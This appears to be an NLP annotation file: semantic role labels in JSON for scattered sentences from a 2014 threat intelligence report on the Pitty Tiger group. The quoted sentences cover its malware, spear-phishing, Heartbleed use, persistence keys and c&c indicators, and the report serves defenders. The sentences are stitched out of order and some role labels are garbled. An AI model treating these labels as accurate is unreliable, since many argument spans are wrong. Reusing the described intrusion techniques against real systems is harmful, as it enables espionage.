"index": 5}, "ARG2": {"text": "to the c&c server"}}, "responds": {"ARGM-TMP": {"text": "Once this data has been transferred to the c&c server"}, "ARG0": {"text": "it"}, "V": {"text": "responds", "index": 12}, "ARGM-MNR": {"text": "by sending additional malware to execute on the machine"}}, "sending": {"ARG0": {"text": "it"}, "V": {"text": "sending", "index": 14}, "ARG1": {"text": "additional malware"}, "ARG2": {"text": "to execute on the machine"}}, "execute": {"V": {"text": "execute", "index": 18}, "ARG1": {"text": "on/ the machine"}}}, "\n\n    We have also been able to testify that the Pitty Tiger group has successfully collected information on\n    some of their targets by exploiting the HeartBleed<fn>1</fn> bug": {"have": {"V": {"text": "have", "index": 1}}, "been": {"ARG1": {"text": "We"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "been", "index": 3}, "ARG2": {"text": "able to testify that the Pitty Tiger group has successfully collected information on some of their targets by exploiting the HeartBleed bug"}}, "testify": {"ARG0": {"text": "We"}, "V": {"text": "testify", "index": 6}, "ARG1": {"text": "that the Pitty Tiger group has successfully collected information on some of their targets by exploiting the HeartBleed bug"}}, "has": {"V": {"text": "has", "index": 12}}, "collected": {"ARG0": {"text": "the Pitty Tiger group"}, "ARGM-MNR": {"text": "successfully/ by exploiting the HeartBleed bug"}, "V": {"text": "collected", "index": 14}, "ARG1": {"text": "information on some of their targets"}}, "exploiting": {"ARG0": {"text": "the Pitty Tiger group"}, "V": {"text": "exploiting", "index": 22}, "ARG1": {"text": "the HeartBleed bug"}}}, "\n</section>\n<section>\n    <heading>Installation</heading>\n\n    The binary we found is named 3200.exe<fn>1</fn>, and triggers the following alarms in our sandbox:\n\n<figure></figure>\n\n\n                          <caption>Alarms in our sandbox system, triggered by the Troj/Goldsun-B malware</caption>\n\n    The \u201crelease.tmp\u201d file is dropped on the system:\n\n\n\n<footnote>\n    1\n        MD5 hash: 728d6d3c98b17de3261eaf76b9c3eb7a\n        </footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 23/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n<figure></figure>\n\n\n                                      <caption>File dropped by the malware in our sandbox</caption>\n\n    The binary is also copied to the user\u2019s \u201cApplication Data\u201d directory, and injects the \u201crelease.tmp\u201d file\n    in \u201cexplorer.exe\u201d": {"is": {"ARG1": {"text": "The binary"}, "V": {"text": "is", "index": 2}, "ARGM-ADV": {"text": "also"}, "ARG2": {"text": "copied to the user \u2019s \u201c Application Data \u201d directory"}}, "copied": {"ARG1": {"text": "The binary"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "copied", "index": 4}, "ARG0": {"text": "to the user \u2019s \u201c Application Data \u201d directory"}}, "injects": {"ARG0": {"text": "The binary"}, "V": {"text": "injects", "index": 16}, "ARG1": {"text": "the \u201c release.tmp \u201d file in \u201c explorer.exe \u201d"}}}, " The\n    attackers have everything they need to start looking for an entry point to the company\u2019s network and\n    establish one or several permanent backdoors into the environment": {"have": {"ARG0": {"text": "The attackers"}, "V": {"text": "have", "index": 2}, "ARG1": {"text": "everything they need to start looking for an entry point to the company \u2019s network and establish one or several permanent backdoors into the environment"}}, "need": {"ARG0": {"text": "they"}, "V": {"text": "need", "index": 5}, "ARGM-PRP": {"text": "to start looking for an entry point to the company \u2019s network and establish one or several permanent backdoors into the environment"}}, "start": {"ARG0": {"text": "they"}, "V": {"text": "start", "index": 7}, "ARG1": {"text": "looking for an entry point to the company \u2019s network"}}, "looking": {"V": {"text": "looking", "index": 8}, "ARG1": {"text": "for an entry point to the company \u2019s network"}}, "establish": {"V": {"text": "establish", "index": 19}, "ARG1": {"text": "one"}}}, "\n\n    We also found a lot of vulnerability scanners launched by the attackers at different targets, yet there\n    was no sign of compromise": {"found": {"ARG0": {"text": "We"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "found", "index": 2}, "ARG1": {"text": "a lot of vulnerability scanners launched by the attackers at different targets"}}, "launched": {"ARG1": {"text": "vulnerability scanners"}, "V": {"text": "launched", "index": 8}, "ARG0": {"text": "by the attackers"}, "ARGM-MNR": {"text": "at different targets"}}, "was": {"V": {"text": "was", "index": 18}, "ARG1": {"text": "no sign of compromise"}}}, "\n\n\n<figure></figure>\n\n                      <caption>Memory data leak from one server \u2013 Heartbleed exploit on one of PittyTiger\u2019s targets</caption>\n\n\n\n<footnote>\n    1\n        http://heartbleed.com/\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 10/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n    Running automated vulnerability scanners on whole ranges of IP addresses used by the targets or\n    on several domains is a very noisy way to collect information and find server vulnerabilities": {"Running": {"V": {"text": "Running", "index": 0}, "ARG1": {"text": "automated vulnerability scanners"}, "ARGM-LOC": {"text": "on whole ranges"}}, "automated": {"V": {"text": "automated", "index": 1}, "ARG1": {"text": "vulnerability scanners"}}, "used": {"ARG1": {"text": "IP addresses"}, "V": {"text": "used", "index": 10}, "ARG0": {"text": "by the targets or on several domains"}}, "is": {"ARG1": {"text": "Running automated vulnerability scanners on whole ranges of IP addresses used by the targets or on several domains"}, "V": {"text": "is", "index": 18}, "ARG2": {"text": "a very noisy way to collect information and find server vulnerabilities"}}, "collect": {"ARGM-MNR": {"text": "a very noisy way"}, "V": {"text": "collect", "index": 24}, "ARG1": {"text": "information"}}, "find": {"ARGM-MNR": {"text": "a very noisy way"}, "V": {"text": "find", "index": 27}, "ARG1": {"text": "server vulnerabilities"}}}, " A Hello packet is then sent:\n\n\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 24/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n<figure></figure>\n\n\n                                 <caption>Hello packet sent by Troj/Goldsun-B to its c&c server</caption>\n\n    The bot then repeatedly sends GET requests on \u201c/httpdocs/mm/<bot_id>/ComMand.sec\u201d to retrieve\n    remote commands": {"is": {"V": {"text": "is", "index": 3}}, "sent": {"ARG1": {"text": "A Hello packet"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "sent", "index": 5}, "ARG2": {"text": "to retrieve remote commands"}}, "retrieve": {"V": {"text": "retrieve", "index": 10}, "ARG1": {"text": "remote commands"}}}, "\n\n    They are quite unprofessional in their way of using their infrastructure: they do launch vulnerability\n    scanners directly from a c&c server and also use their connection for personal activities\n    (downloading pornographic material for example, as we have seen a whole folder on a c&c server\n    full of xxx torrent links)": {"are": {"ARG1": {"text": "They"}, "V": {"text": "are", "index": 1}, "ARG2": {"text": "quite unprofessional in their way of using their infrastructure"}}, "using": {"V": {"text": "using", "index": 8}, "ARG1": {"text": "their infrastructure"}}, "do": {"ARG0": {"text": "they"}, "V": {"text": "do", "index": 13}, "ARG1": {"text": "launch vulnerability scanners"}, "ARGM-MNR": {"text": "directly"}}, "launch": {"ARG0": {"text": "they"}, "V": {"text": "launch", "index": 14}, "ARG1": {"text": "vulnerability scanners"}, "ARGM-MNR": {"text": "directly"}, "ARGM-DIR": {"text": "from a c&c server"}, "ARGM-TMP": {"text": "as we have seen a whole folder on a c&c server full of xxx torrent links )"}}, "use": {"ARG0": {"text": "they"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "use", "index": 24}, "ARG1": {"text": "their connection for personal activities ("}, "ARG2": {"text": "downloading pornographic material for example"}, "ARGM-TMP": {"text": "as we have seen a whole folder on a c&c server full of xxx torrent links )"}}, "downloading": {"ARG0": {"text": "they"}, "V": {"text": "downloading", "index": 31}, "ARG1": {"text": "pornographic material"}, "ARGM-PRP": {"text": "for example"}}, "have": {"V": {"text": "have", "index": 39}}, "seen": {"ARG0": {"text": "we"}, "V": {"text": "seen", "index": 40}, "ARG1": {"text": "a whole folder on a c&c server full of xxx torrent links )"}}}, "\n</section>\n<section>\n    <heading>Installation</heading>\n\n    Unsurprisingly, when running in our sandbox, the RAT triggers the same alarms as PittyTiger:\n\n<figure></figure>\n\n\n                                <caption>Alarms in our sandbox system, triggered by the CT RAT</caption>\n\n\n\n    The binary drops two files in \u201cC:\\Program Files\\Internet Explorer\u201d:\n\n\n<footnote>\n\n    1\n        MD5 hash: f65dc0b3eeb3c393e89ab49a3fac95a8\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 19/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n                                      <caption>Files dropped by the CT RAT in our sandbox</caption>\n\n    The \u201cieupdate.exe\u201d is a simple binary to inject the DLL into \u201cexplorer.exe\u201d": {"is": {"ARG1": {"text": "The \u201c ieupdate.exe \u201d"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "a simple binary to inject the DLL into \u201c explorer.exe \u201d"}}, "inject": {"V": {"text": "inject", "index": 9}, "ARG1": {"text": "the DLL"}, "ARG2": {"text": "into \u201c explorer.exe \u201d"}}}, "\n\n</section>\n<section>\n\n          <heading>ACCESS STRENGTHENING & LATERAL MOVES</heading>\n\n    Attackers have gained access to one or several machines inside the target\u2019s corporate network": {"have": {"V": {"text": "have", "index": 1}}, "gained": {"ARG0": {"text": "Attackers"}, "V": {"text": "gained", "index": 2}, "ARG1": {"text": "access to one or several machines"}, "ARGM-LOC": {"text": "inside the target \u2019s corporate network"}}}, "\n\n    A computer named CHMXY-PC connected to the c&c via RDP with IP address 58.61.40.5": {"named": {"ARG1": {"text": "A computer"}, "V": {"text": "named", "index": 2}, "ARG2": {"text": "CHMXY - PC connected to the c&c via RDP with IP address 58.61.40.5"}}, "connected": {"ARG1": {"text": "CHMXY - PC"}, "V": {"text": "connected", "index": 6}, "ARG2": {"text": "to the c&c"}}}, "    Hong Kong              113.10.240.255                                                 12-16\n\n    Asia Data (hong   Hong Kong City,        101.1.17.0 -          101.1.25.74       zeng.skypetm.com.tw    Actually in use\n    Kong) Limited     Hong Kong              101.1.31.255\n\n    Isp Satellite     Hong Kong City,        202.174.130.0 -       202.174.130.110   ms11.skypetm.com.tw    2011-02-27/2013-\n    Broadband         Hong Kong              202.174.130.255                                                12-16\n    Provider\n\n    Jeongkyunghee     Anyang, South          221.144.0.0 -         221.150.164.114   link.skypetm.com.tw    2011-06-29/2012-\n                      Korea                  221.168.255.255                                                12-18\n\n\n</table>\n</section>\n<section>\n             <heading>COMMON CHARACTERISTICS BETWEEN THE TWO DOMAINS</heading>\n</section>\n<section>\n          <heading>Malware families and samples</heading>\n\n    Avstore.com.tw and skypetm.com.tw have 4 malware families in common, communicating to\n    subdomains of both domains:\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 35/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n\n             <caption>Links between malware samples, IP addresses and c&cs associated to avstore.com.tw and skypetm.com.tw</caption>\n\n\n</section>\n<section>\n\n          <heading>OTHER DOMAINS LINKED WITH THE PITTY TIGER GROUP</heading>\n<table>\n    Domain                    Shares         with                             Comment\n\n    paccfic.com               Whois          acers.com.tw,\n                              information    foxcom.com.tw,\n                                              dopodo.com.tw,\n                                             stareastnet.com.tw\n\n\n    webconference.com.tw      Whois          techsun.com.tw\n                              information\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 36/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n\n                          IP Address     techsun.com.tw,\n                                         trendmicro.org.tw\n\n\n\n    stareastnet.com.tw    Whois          acers.com.tw,                     Two PittyTiger malware and a CT RAT have been\n                          information    foxcom.com.tw,                    pointing to several stareastnet.com.tw subdomains": {"have": {"V": {"text": "have", "index": 84}}, "been": {"ARGM-ADV": {"text": "Actually"}, "ARG1": {"text": "Two PittyTiger malware and a CT RAT"}, "V": {"text": "been", "index": 85}, "ARG2": {"text": "information foxcom.com.tw"}}, "pointing": {"ARG0": {"text": "Hong Kong 113.10.240.255 12 - 16 Asia Data ( hong Hong Kong City , 101.1.17.0 - 101.1.25.74 zeng.skypetm.com.tw"}, "ARGM-LOC": {"text": "in use Kong ) Limited Hong Kong 101.1.31.255"}, "V": {"text": "pointing", "index": 89}, "ARG2": {"text": "to several stareastnet.com.tw subdomains"}}, "subdomains": {"ARG1": {"text": "202.174.130.0 - 202.174.130.110 ms11.skypetm.com.tw"}, "V": {"text": "subdomains", "index": 93}}}, " This e-mail spoofed the\n    identity of an employee of a targeted company:\n\n<figure>\n    From: XXXXXXX\n    To: XXXXXXX\n    File: 1 Attachment: Bird\u2019s Eye Point of View.doc\n\n\n    While the holiday season means clustering clustering \u2018time for a\n    vacation\u2019 for many, there are Those That Will Be of us staying home this\n    year": {"spoofed": {"ARG0": {"text": "This e - mail"}, "V": {"text": "spoofed", "index": 4}, "ARG1": {"text": "the identity of an employee of a targeted company : From : XXXXXXX To : XXXXXXX File : 1 Attachment : Bird \u2019s Eye Point of View.doc While the holiday season means clustering clustering \u2018 time for a vacation \u2019 for many , there are Those That Will Be of us staying home this year"}}, "targeted": {"V": {"text": "targeted", "index": 12}, "ARG1": {"text": "company"}}, "means": {"ARG0": {"text": "the holiday season"}, "V": {"text": "means", "index": 36}, "ARG1": {"text": "clustering clustering \u2018 time for a vacation \u2019 for many"}}, "clustering": {"V": {"text": "clustering", "index": 37}, "ARG1": {"text": "clustering \u2018 time"}, "ARGM-PRP": {"text": "for a vacation \u2019 for many"}}, "are": {"ARGM-ADV": {"text": "While the holiday season means clustering clustering \u2018 time for a vacation \u2019 for many"}, "V": {"text": "are", "index": 49}, "ARG1": {"text": "Those That Will Be of us staying home this year"}}, "Will": {"R-ARG1": {"text": "That"}, "V": {"text": "Will", "index": 52}}, "Be": {"ARG1": {"text": "Those"}, "R-ARG1": {"text": "That"}, "ARGM-MOD": {"text": "Will"}, "V": {"text": "Be", "index": 53}, "ARG2": {"text": "of us staying home this year"}}, "staying": {"ARG1": {"text": "us"}, "V": {"text": "staying", "index": 56}, "ARGM-LOC": {"text": "home"}, "ARGM-TMP": {"text": "this year"}}}, "\n\n\n</section>\n<section>\n            <heading>DIRECT ATTACKS</heading>\n    Although we have not been able to find evidences of any attack aimed at exploiting vulnerabilities on\n    the group\u2019s targets servers, we have been able to record several vulnerability scanning launched\n    from one c&c server straight to the targets": {"have": {"V": {"text": "have", "index": 2}}, "been": {"ARG1": {"text": "we"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "been", "index": 4}, "ARG2": {"text": "able to find evidences of any attack aimed at exploiting vulnerabilities on the group \u2019s targets servers"}}, "find": {"ARG0": {"text": "we"}, "V": {"text": "find", "index": 7}, "ARG1": {"text": "evidences of any attack aimed at exploiting vulnerabilities on the group \u2019s targets servers"}}, "aimed": {"ARG1": {"text": "any attack"}, "V": {"text": "aimed", "index": 12}, "ARG2": {"text": "at exploiting vulnerabilities on the group \u2019s targets servers"}}, "exploiting": {"V": {"text": "exploiting", "index": 14}, "ARG1": {"text": "vulnerabilities"}, "ARG2": {"text": "on the group \u2019s targets servers"}}, "have_2": {"V": {"text": "have", "index": 24}}, "been_2": {"ARGM-ADV": {"text": "Although we have not been able to find evidences of any attack aimed at exploiting vulnerabilities on the group \u2019s targets servers"}, "ARG1": {"text": "we"}, "V": {"text": "been", "index": 25}, "ARG2": {"text": "able to record several vulnerability scanning launched from one c&c server straight to the targets"}}, "record": {"ARG0": {"text": "we"}, "V": {"text": "record", "index": 28}, "ARG1": {"text": "several vulnerability scanning launched from one c&c server straight to the targets"}}, "launched": {"ARG1": {"text": "several vulnerability scanning"}, "V": {"text": "launched", "index": 32}, "ARGM-DIR": {"text": "from one c&c server/ straight to the targets"}}}, " It allowed the Pitty Tiger group to get admin credentials from at least one target, for\n    example": {"allowed": {"ARG0": {"text": "It"}, "V": {"text": "allowed", "index": 1}, "ARG1": {"text": "the Pitty Tiger group to get admin credentials from at least one target , for example"}}, "get": {"ARG0": {"text": "the Pitty Tiger group"}, "V": {"text": "get", "index": 7}, "ARG1": {"text": "admin credentials"}, "ARG2": {"text": "from at least one target"}}}, "\n\n</section>\n\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 11/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<section>\n<heading>\n    MALWARE INFORMATION\n</heading>\n</section>\n<section>\n          <heading>TROJ/REROL.A</heading>\n    One of the favorite methods used by the Pitty Tiger group to infect users is to use a Microsoft Office\n    Word document which exploits a specific vulnerability": {"used": {"ARG1": {"text": "the favorite methods"}, "V": {"text": "used", "index": 5}, "ARG0": {"text": "by the Pitty Tiger group"}, "ARG2": {"text": "to infect users"}}, "infect": {"V": {"text": "infect", "index": 12}, "ARG1": {"text": "users"}}, "is": {"ARG1": {"text": "One of the favorite methods used by the Pitty Tiger group to infect users"}, "V": {"text": "is", "index": 14}, "ARG2": {"text": "to use a Microsoft Office Word document which exploits a specific vulnerability"}}, "use": {"V": {"text": "use", "index": 16}, "ARG1": {"text": "a Microsoft Office Word document which exploits a specific vulnerability"}}, "exploits": {"ARG0": {"text": "a Microsoft Office Word document"}, "R-ARG0": {"text": "which"}, "V": {"text": "exploits", "index": 23}, "ARG1": {"text": "a specific vulnerability"}}}, " The variants we have seen did use that same User-\n    Agent:\n<list>\n                      Mozilla/4.0 (compatible;)\n</list>\n\n    The persistence mechanism used by the malware is the creation of a registry key named \u201cShell\u201d\n    containing the path to the malware on the infected system:\n<list>\n              Key Path: \\REGISTRY\\USER\\<SID>\\Software\\Microsoft\\Windows\n              NT\\CurrentVersion\\Winlogon\n              Value Name : Shell\n              Value : explorer.exe,C:\\DOCUME~1\\XXXXXX\\APPLIC~1\\svohost.exe,\n</list>\n\n    The payload of this malware is used to collect information on the newly infected host, and send it\n    back to the c&c server": {"have": {"V": {"text": "have", "index": 3}}, "seen": {"ARG1": {"text": "The variants"}, "ARG0": {"text": "we"}, "V": {"text": "seen", "index": 4}}, "did": {"V": {"text": "did", "index": 5}}, "use": {"ARG0": {"text": "The variants we have seen"}, "V": {"text": "use", "index": 6}, "ARG1": {"text": "that same User- Agent"}}, "is": {"V": {"text": "is", "index": 17}}, "used": {"ARG1": {"text": "The payload of this malware"}, "V": {"text": "used", "index": 18}, "ARG2": {"text": "to collect information on the newly infected host"}}, "collect": {"V": {"text": "collect", "index": 20}, "ARG1": {"text": "information on the newly infected host"}}, "infected": {"ARGM-TMP": {"text": "newly"}, "V": {"text": "infected", "index": 25}, "ARG1": {"text": "host"}}, "send": {"V": {"text": "send", "index": 29}, "ARG1": {"text": "it"}, "ARG2": {"text": "back to the c&c server"}}}, "\n\n    We have been able to find a spear phishing e-mail crafted by the attackers": {"have": {"V": {"text": "have", "index": 1}}, "been": {"ARG1": {"text": "We"}, "V": {"text": "been", "index": 2}, "ARG2": {"text": "able to find a spear phishing e - mail crafted by the attackers"}}, "find": {"ARG0": {"text": "We"}, "V": {"text": "find", "index": 5}, "ARG1": {"text": "a spear phishing e - mail crafted by the attackers"}}, "phishing": {"ARG0": {"text": "a spear"}, "V": {"text": "phishing", "index": 8}, "ARG1": {"text": "e - mail crafted by the attackers"}}, "crafted": {"ARG1": {"text": "a spear phishing e - mail"}, "V": {"text": "crafted", "index": 12}, "ARG0": {"text": "by the attackers"}}}, "\n\n    Please note that at this point, the attacker has at least the privileges of a local administrator, since\n    he is allowed to write content in the system32 folder of a Windows XP system": {"note": {"ARGM-DIS": {"text": "Please"}, "V": {"text": "note", "index": 1}, "ARG1": {"text": "that at this point , the attacker has at least the privileges of a local administrator , since he is allowed to write content in the system32 folder of a Windows XP system"}}, "has": {"ARGM-TMP": {"text": "at this point"}, "ARG0": {"text": "the attacker"}, "V": {"text": "has", "index": 9}, "ARG1": {"text": "at least the privileges of a local administrator"}, "ARGM-CAU": {"text": "since he is allowed to write content in the system32 folder of a Windows XP system"}}, "is": {"V": {"text": "is", "index": 21}}, "allowed": {"V": {"text": "allowed", "index": 22}, "ARG1": {"text": "to write content in the system32 folder of a Windows XP system"}}, "write": {"ARG0": {"text": "he"}, "V": {"text": "write", "index": 24}, "ARG1": {"text": "content"}, "ARGM-LOC": {"text": "in the system32 folder of a Windows XP system"}}}, " The data following the header is encrypted using RC4 with\n    the previous key": {"following": {"ARG1": {"text": "The data"}, "V": {"text": "following", "index": 2}, "ARG2": {"text": "the header"}}, "is": {"ARG1": {"text": "The data following the header"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "encrypted using RC4 with the previous key"}}, "encrypted": {"ARG1": {"text": "The data following the header"}, "V": {"text": "encrypted", "index": 6}, "ARGM-MNR": {"text": "using RC4 with the previous key"}}, "using": {"V": {"text": "using", "index": 7}, "ARG1": {"text": "RC4"}, "ARG2": {"text": "with the previous key"}}}, " After being injected, it starts sending its Hello\n    packet to its c&c server:\n\n\n\n<figure></figure>\n                                     <caption>Sample communication from PittyTiger RAT</caption>\n\n\n</section>\n\n \n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 17/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<section>\n    <heading>Command & Control</heading>\n\n    All the requests sent to the c&c contains the string \u201c/FC001/\u201d followed by the bot id": {"being": {"V": {"text": "being", "index": 1}}, "injected": {"V": {"text": "injected", "index": 2}}, "starts": {"ARGM-TMP": {"text": "After being injected"}, "V": {"text": "starts", "index": 5}, "ARG1": {"text": "sending its Hello packet to its c&c server"}}, "sending": {"ARG0": {"text": "it"}, "V": {"text": "sending", "index": 6}, "ARG1": {"text": "its Hello packet"}, "ARG2": {"text": "to its c&c server"}}, "sent": {"ARG1": {"text": "All the requests"}, "V": {"text": "sent", "index": 18}, "ARG2": {"text": "to the c&c"}}, "contains": {"ARG0": {"text": "All the requests sent to the c&c"}, "V": {"text": "contains", "index": 22}, "ARG1": {"text": "the string \u201c /FC001/ \u201d followed by the bot i d"}}, "followed": {"ARG2": {"text": "the string \u201c /FC001/ \u201d"}, "V": {"text": "followed", "index": 28}, "ARG1": {"text": "by the bot i d"}}}, "\n\n    Moreover, the built malware we found in the same folder was configured to connect to a local IP\n    address, probably for testing purposes": {"built": {"V": {"text": "built", "index": 3}}, "found": {"ARG1": {"text": "the built malware"}, "ARG0": {"text": "we"}, "V": {"text": "found", "index": 6}, "ARGM-LOC": {"text": "in the same folder"}}, "was": {"ARGM-DIS": {"text": "Moreover"}, "ARG1": {"text": "the built malware we found in the same folder"}, "V": {"text": "was", "index": 11}, "ARG2": {"text": "configured to connect to a local IP address , probably for testing purposes"}}, "configured": {"ARGM-DIS": {"text": "Moreover"}, "ARG1": {"text": "the built malware we found in the same folder"}, "V": {"text": "configured", "index": 12}, "ARG4": {"text": "to connect to a local IP address , probably for testing purposes"}}, "connect": {"ARG0": {"text": "the built malware we found in the same folder"}, "V": {"text": "connect", "index": 14}, "ARG1": {"text": "to a local IP address"}, "ARGM-PRP": {"text": "probably for testing purposes"}}}, "\n\n    The data sent is simply encoded using base64, there is no cipher at all": {"sent": {"ARG1": {"text": "The data"}, "V": {"text": "sent", "index": 2}}, "is": {"V": {"text": "is", "index": 3}}, "encoded": {"ARG1": {"text": "The data sent"}, "ARGM-ADV": {"text": "simply"}, "V": {"text": "encoded", "index": 5}, "ARGM-PRD": {"text": "using base64"}}, "using": {"V": {"text": "using", "index": 6}, "ARG1": {"text": "base64"}}, "is_2": {"V": {"text": "is", "index": 10}, "ARG1": {"text": "no cipher at all"}}}, " This one is also used by the group to infect\n    workstations, collect system information, and install more malware on the infected computer": {"is": {"V": {"text": "is", "index": 2}}, "used": {"ARG1": {"text": "This one"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "used", "index": 4}, "ARG0": {"text": "by the group"}, "ARG2": {"text": "to infect workstations , collect system information"}}, "infect": {"ARG0": {"text": "This one"}, "V": {"text": "infect", "index": 9}, "ARG1": {"text": "workstations"}}, "collect": {"ARG0": {"text": "This one"}, "V": {"text": "collect", "index": 12}, "ARG1": {"text": "system information"}}, "install": {"ARG0": {"text": "This one"}, "V": {"text": "install", "index": 17}, "ARG1": {"text": "more malware"}, "ARG2": {"text": "on the infected computer"}}}, "\n\n    As soon as the attackers are sure they have enough access, they start looking for two things:\n    intellectual property (or anything else they want to know or steal) in alignment with predefined\n    mission objectives, and a means of privilege escalation to facilitate lateral movement within the\n    compromised environment": {"are": {"ARG1": {"text": "the attackers"}, "V": {"text": "are", "index": 5}, "ARG2": {"text": "sure they have enough access"}}, "have": {"ARG0": {"text": "they"}, "V": {"text": "have", "index": 8}, "ARG1": {"text": "enough access"}}, "start": {"ARGM-TMP": {"text": "As soon as the attackers are sure they have enough access"}, "ARG0": {"text": "they"}, "V": {"text": "start", "index": 13}, "ARG1": {"text": "looking for two things : intellectual property ( or anything else they want to know or steal ) in alignment with predefined mission objectives , and a means of privilege escalation to facilitate lateral movement within the compromised environment"}}, "looking": {"ARG0": {"text": "they"}, "V": {"text": "looking", "index": 14}, "ARG1": {"text": "for two things : intellectual property ( or anything else they want to know or steal ) in alignment with predefined mission objectives , and a means of privilege escalation to facilitate lateral movement within the compromised environment"}}, "want": {"ARG0": {"text": "they"}, "V": {"text": "want", "index": 26}, "ARG1": {"text": "to know or steal ) in alignment with predefined mission objectives"}}, "know": {"ARG0": {"text": "they"}, "V": {"text": "know", "index": 28}}, "steal": {"ARG1": {"text": "anything else"}, "ARG0": {"text": "they"}, "V": {"text": "steal", "index": 30}, "ARG2": {"text": ")/ with predefined mission objectives"}, "ARGM-LOC": {"text": "in alignment"}}, "facilitate": {"ARG0": {"text": "privilege escalation"}, "V": {"text": "facilitate", "index": 46}, "ARG1": {"text": "lateral movement"}, "ARGM-LOC": {"text": "within the compromised environment"}}, "compromised": {"V": {"text": "compromised", "index": 51}, "ARG1": {"text": "environment"}}}, " Up to 5 c&c servers\n    can be configured, but our sample only had one: \u201cey.avstore.com.tw:53\u201d": {"can": {"ARG1": {"text": "Up to 5 c&c servers"}, "V": {"text": "can", "index": 5}, "C-ARG1": {"text": "be configured"}}, "be": {"ARG1": {"text": "Up to 5 c&c servers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "be", "index": 6}, "ARG2": {"text": "configured"}}, "configured": {"ARG1": {"text": "Up to 5 c&c servers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "configured", "index": 7}}, "had": {"ARG0": {"text": "our sample"}, "ARGM-ADV": {"text": "only"}, "V": {"text": "had", "index": 13}, "ARG1": {"text": "one : \u201c ey.avstore.com.tw:53 \u201d"}}}, "\n    Remember to look down!\n\n\n    XXXXXX\n</figure>\n\n    The attached file is a Microsoft Office Word document triggering CVE-2014-1761 to infect the\n    computer it is sent to:\n\n\n\n<figure></figure>\n                          <caption>Word document used to infect computers with Troj/ReRol.A</caption>\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 9/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n    While this example looks very \u201camateur\u201d for a spear phishing attempt, we suppose the group has\n    conducted more advanced spear phishing campaigns, based on the fact that we found infected\n    Word documents showing content stolen from victims of the group": {"Remember": {"V": {"text": "Remember", "index": 0}, "ARG1": {"text": "to look down"}}, "look": {"V": {"text": "look", "index": 2}, "ARGM-DIR": {"text": "down"}}, "looks": {"ARG0": {"text": "this example"}, "V": {"text": "looks", "index": 9}, "ARG1": {"text": "very \u201c amateur \u201d"}, "ARGM-PRP": {"text": "for a spear phishing attempt"}}, "phishing": {"V": {"text": "phishing", "index": 17}, "ARG0": {"text": "attempt"}}, "suppose": {"ARGM-ADV": {"text": "While this example looks very \u201c amateur \u201d for a spear phishing attempt"}, "ARG0": {"text": "we"}, "V": {"text": "suppose", "index": 21}, "ARG1": {"text": "the group has conducted more advanced spear phishing campaigns , based on the fact that we found infected Word documents showing content stolen from victims of the group"}}, "has": {"V": {"text": "has", "index": 24}}, "conducted": {"ARG0": {"text": "the group"}, "V": {"text": "conducted", "index": 25}, "ARG1": {"text": "more advanced spear phishing campaigns"}, "ARGM-ADV": {"text": "based on the fact that we found infected Word documents showing content stolen from victims of the group"}}, "phishing_2": {"V": {"text": "phishing", "index": 29}, "ARG1": {"text": "campaigns"}}, "based": {"ARG1": {"text": "more advanced spear phishing campaigns"}, "V": {"text": "based", "index": 32}, "ARG2": {"text": "on the fact that we found infected Word documents showing content stolen from victims of the group"}}, "found": {"ARG0": {"text": "we"}, "V": {"text": "found", "index": 38}, "ARG1": {"text": "infected Word documents showing content stolen from victims of the group"}}, "infected": {"V": {"text": "infected", "index": 39}, "ARG1": {"text": "Word documents showing content stolen from victims of the group"}}, "showing": {"ARG0": {"text": 